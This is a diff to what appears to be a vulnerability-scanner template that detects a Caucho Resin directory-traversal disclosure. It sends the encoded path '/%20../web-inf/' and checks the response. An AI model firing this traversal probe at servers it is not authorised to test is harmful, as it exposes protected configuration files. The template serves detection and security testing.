@@ -3,11 +3,10 @@ info:
   name: Caucho Resin Information Disclosure
   author: princechaddha
   severity: high
-  reference:
+  reference: |
     - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-200705-315
   tags: resin,caucho,lfr
-
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/%20../web-inf/"
@@ -16,7 +15,6 @@ http:
       - type: status
         status:
           - 200
-
       - type: word
         words:
           - "/ ../web-inf/"
